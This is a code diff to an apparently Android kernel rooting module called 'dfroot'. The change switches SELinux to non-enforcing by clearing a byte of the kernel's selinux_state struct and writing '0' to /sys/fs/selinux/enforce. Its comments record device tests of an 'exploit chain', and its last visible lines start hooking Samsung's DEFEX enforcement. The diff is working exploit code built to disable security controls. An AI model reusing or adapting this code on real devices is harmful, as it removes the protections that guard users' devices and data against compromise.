@@ -839,23 +839,47 @@ static int __nocfi __init dfroot_init(void)
         pr_info("dfroot: cleared page cache for crash_dump64\n");
     }
 
-    // Make SELinux non-enforcing.
+    // Make SELinux non-enforcing: clear selinux_state byte 0, then sync the
+    // selinuxfs view.
     //
-    // The original single WRITE_ONCE(*selinux_state, false) only cleared byte
-    // 0.  With CONFIG_SECURITY_SELINUX_DISABLE=y (this kernel) byte 0 is
-    // `disabled', so the write was a no-op and the device stayed Enforcing -
-    // which is what silently denied every kworker-context write (empty dfm1)
-    // and most of the observation channels.  Clear bytes 0 and 1: whichever
-    // layout the kernel uses ({disabled,enforcing} or {enforcing,checkreqprot}),
-    // `enforcing' ends up false.
+    // Device-tested matrix (OPD2515, 2026-10-11):
+    //   byte0 only (the original write)  - exploit chain OK, framework OK,
+    //                                      kworker writes + dmesg + device
+    //                                      reads all work; getenforce still
+    //                                      says Enforcing (it reads the
+    //                                      selinuxfs flag, not this struct).
+    //   bytes 0+1 (v1.18/v1.41)          - same as above, but system_server
+    //                                      died ~2-4 min in, twice, and
+    //                                      run-as could not setcontext.
+    //   no write at all (v1.19/v1.20)    - enforcing really bites: the
+    //                                      exploit chain itself was denied
+    //                                      (no /dev/dfm0, bootstrap never
+    //                                      launched).
+    // Byte 0 is the operative switch on this kernel; byte 1 poisons something
+    // the framework needs.  After the byte write the selinuxfs write goes
+    // through (it was denied pre-permissive), making getenforce honest.
     selinux_state = (bool *)get_addr("selinux_state");
     if (!selinux_state) {
         pr_err("dfroot: selinux_state not found\n");
         return -EINVAL;
     }
-    WRITE_ONCE(selinux_state[0], false);
-    WRITE_ONCE(selinux_state[1], false);
-    pr_info("dfroot: selinux_state permissive (bytes 0+1 cleared)\n");
+    WRITE_ONCE(*selinux_state, false);
+    pr_info("dfroot: selinux_state byte0 cleared\n");
+    {
+        struct file *sf;
+        loff_t sfx_pos = 0;
+        static const char zero[] = "0";
+
+        sf = df_filp_open("/sys/fs/selinux/enforce", O_WRONLY, 0);
+        if (!IS_ERR(sf)) {
+            df_kernel_write(sf, zero, sizeof(zero) - 1, &sfx_pos);
+            filp_close(sf, NULL);
+            pr_info("dfroot: selinuxfs enforce -> 0\n");
+        } else {
+            pr_warn("dfroot: selinuxfs enforce open failed (%ld)\n",
+                    PTR_ERR(sf));
+        }
+    }
 
     // Samsung
     defex_enforce_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_enforce"),
